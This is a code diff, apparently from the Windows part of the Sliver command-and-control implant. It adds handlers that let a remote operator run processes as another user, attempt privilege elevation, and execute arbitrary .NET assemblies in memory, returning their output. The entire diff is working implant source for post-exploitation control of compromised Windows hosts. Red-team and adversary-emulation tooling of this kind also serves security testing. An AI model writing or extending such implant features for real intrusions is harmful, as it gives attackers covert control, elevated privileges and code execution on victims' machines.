@@ -6,6 +6,7 @@ import (
 	// {{else}}{{end}}
 
 	pb "sliver/protobuf/sliver"
+	"sliver/sliver/priv"
 	"sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
@@ -14,9 +15,12 @@ import (
 var (
 	windowsHandlers = map[uint32]RPCHandler{
 		// Windows Only
-		pb.MsgTask:           taskHandler,
-		pb.MsgRemoteTask:     remoteTaskHandler,
-		pb.MsgProcessDumpReq: dumpHandler,
+		pb.MsgTask:               taskHandler,
+		pb.MsgRemoteTask:         remoteTaskHandler,
+		pb.MsgProcessDumpReq:     dumpHandler,
+		pb.MsgImpersonateReq:     impersonateHandler,
+		pb.MsgElevateReq:         elevateHandler,
+		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 
 		// Generic
 		pb.MsgPsListReq:   psHandler,
@@ -63,4 +67,70 @@ func remoteTaskHandler(data []byte, resp RPCResponse) {
 	}
 	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
 	resp([]byte{}, err)
+}
+
+func impersonateHandler(data []byte, resp RPCResponse) {
+	impersonateReq := &pb.ImpersonateReq{}
+	err := proto.Unmarshal(data, impersonateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	out, err := priv.RunProcessAsUser(impersonateReq.Username, impersonateReq.Process, impersonateReq.Args)
+	if err != nil {
+		resp([]byte{}, err)
+		return
+	}
+	impersonate := &pb.Impersonate{
+		Output: out,
+	}
+	data, err = proto.Marshal(impersonate)
+	resp(data, err)
+}
+
+func elevateHandler(data []byte, resp RPCResponse) {
+	elevateReq := &pb.ElevateReq{}
+	err := proto.Unmarshal(data, elevateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	elevate := &pb.Elevate{}
+	err = priv.Elevate()
+	if err != nil {
+		elevate.Err = err.Error()
+		elevate.Success = false
+	} else {
+		elevate.Success = true
+		elevate.Err = ""
+	}
+	data, err = proto.Marshal(elevate)
+	resp(data, err)
+}
+
+func executeAssemblyHandler(data []byte, resp RPCResponse) {
+	execReq := &pb.ExecuteAssemblyReq{}
+	err := proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Arguments, execReq.Timeout)
+	strErr := ""
+	if err != nil {
+		strErr = err.Error()
+	}
+	execResp := &pb.ExecuteAssembly{
+		Output: output,
+		Error:  strErr,
+	}
+	data, err = proto.Marshal(execResp)
+	resp(data, err)
+
 }
